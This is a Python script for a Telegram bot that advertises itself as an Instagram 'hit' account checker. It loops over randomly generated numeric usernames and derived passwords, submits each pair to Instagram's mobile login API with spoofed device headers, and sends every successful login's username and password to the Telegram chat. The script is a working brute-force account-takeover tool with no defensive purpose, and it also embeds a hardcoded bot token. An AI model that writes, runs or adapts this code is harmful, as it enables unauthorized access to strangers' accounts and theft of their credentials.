import telebot
import requests
from telebot import types
import random
import time
import uuid
from uuid import uuid4

E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
Z2 = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;39m' #ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
E1 = '\x1b[1;31m' # احمر
G1 = '\x1b[1;32m'
S1 = '\x1b[1;33m'
Z = '\x1b[2;31m'
G2 = '\x1b[1;32m'
E = '\x1b[1;31m'
G = '\x1b[1;32m'
S = '\x1b[1;33m'
amr = 'حصٲن طࢪؤٲدهُه '
rhaby = int(1)

print(B+f"""
-- -- -- -- - -- -- -- -- -- -- -- -- --
≈ welcome  Friend ⸙
≈ Checker Hit Instagram Accounts
≈ Coded By [{amr}]
-- -- -- -- - -- -- -- -- -- -- -- -- -- 
""")
print('')

bot = telebot.TeleBot('5765972988:AAGDoJd5wi1eKqlEiCkD8offXMCo34OcBRw')
bot.remove_webhook()
print( ''+B+'('+A+'!'+X+')'+B+'  • Click /start On Bot ')
stop = True
@bot.message_handler(commands=['start'])
def send_welcome(message):
	mas = types.InlineKeyboardMarkup(row_width=2)
	v= types.InlineKeyboardButton("Developer ⸙",url='https://t.me/XDev_X1')
	mas.add(v)
	ru = message.from_user.first_name
	Ruk=bot.send_message(message.chat.id,f"""
-- -- -- -- - -- -- -- -- -- -- -- -- --
≈ welcome [{ru}](t.me/XOne_Team) ⸙
≈ Checker Hit Instagram Accounts
≈ Coded By [{amr}](t.me/XDev_X1)
-- -- -- -- - -- -- -- -- -- -- -- -- --
""",parse_mode="Markdown",disable_web_page_preview='True',reply_markup=mas)
	bot.register_next_step_handler(Ruk,ple)
def ple(message):
	mar= types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
	A = types.KeyboardButton(' Start ⸙ ')
	mar.add(A)
	bot.send_message(message.chat.id, "Choose from the buttons at the bottom",reply_markup=mar)
	
@bot.message_handler(func=lambda message: True)		
def send_welcome(message):
	global stop	
	if message.text =='Suspension Stop':
		stop = False			
	if message.text =='Suspension stop':
		stop = False
		mar= types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
		A = types.KeyboardButton(' Start ⸙ ')
		mar.add(A)
		bot.send_message(message.chat.id, "Choose from the buttons at the bottom",reply_markup=mar)		
	if message.text =='Start ⸙':
		stop = True
		mas = types.InlineKeyboardMarkup(row_width=1)
		A = types.InlineKeyboardButton(" start ️", callback_data="F2")
		D = types.InlineKeyboardButton("Developer ⸙",url='https://t.me/XDev_X1')
		mar= types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
		G = types.KeyboardButton('Suspension stop')
		mar.add(G)
		mas.add(A,D)
		bot.send_message(message.chat.id, "Hɪᴛ ᴀᴄᴄᴏᴜɴᴛs ɴᴏᴡ😅",reply_markup=mar)
		bot.send_message(message.chat.id,'Click Run to start',reply_markup=mas)
@bot.callback_query_handler(func=lambda call:True )    
def sdd(call):
	
	@bot.message_handler(func=lambda message: True)		
	def send_welcome(message):
		if message.text =='Suspension stop':
			stop = False
	bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="ᴛᴏᴏʟ ᴄʜᴇᴄᴋɪɴɢ")
	global stop
	good=0
	bad=0
	a7rf = '1234567890'
	nu = [
         '11', '10', '15', '12']
	while stop == True:
	           num = str(''.join((random.choice(nu) for i in range(1))))
	           numbers = str(''.join((random.choice(a7rf) for i in range(7))))
	           user = '20' + num + '1' + numbers
	           password = '0' + num + '1' + numbers
	           time.sleep(1)
	           url = 'https://i.instagram.com/api/v1/accounts/login/'
	           headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing', 
         'Accept-Encoding':'gzip, deflate', 
         'Accept-Language':'en-US', 
         'X-IG-Capabilities':'3brTvw==', 
         'X-IG-Connection-Type':'WIFI', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
         'Host':'i.instagram.com'} 
	           uid = str(uuid4())
	           data = {'uuid':uid, 
         'password':password, 
         'username':user, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'} 
	           r = requests.post(url, headers=headers, data=data)
	           if 'logged_in_user' in r.json():
	               good +=1
	               tt=time.asctime()
	               bot.send_message(call.message.chat.id,f'⌯  ɴᴇᴡ ʜɪᴛ  ⌯\n. — — — — —  — — — — — . \n⌯ ᴜѕᴇʀɴᴀᴍᴇ : {user}\n⌯ ᴘᴀssᴡᴏʀᴅ  : {password} \n. — — — — —  — — — — —\n• Tele : @XDev_X1.\n. — — — — —  — — — — —\n• ᴄʜ : @XOne_Team') 
	           else:
	               bad+=1
	               mas = types.InlineKeyboardMarkup(row_width=1)
	               A = types.InlineKeyboardButton(f" {user}", callback_data="F1")
	               B = types.InlineKeyboardButton(f" Done :{good}", callback_data="F2")
	               e = types.InlineKeyboardButton(f" Bad :{bad}", callback_data="6y")
	               
	               mas.add(A,B,e)
	               bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="ᴛᴏᴏʟ ᴄʜᴇᴄᴋɪɴɢ",reply_markup=mas)

try:
	bot.polling(none_stop=True)
except:
	bot.polling(none_stop=True)
	pass
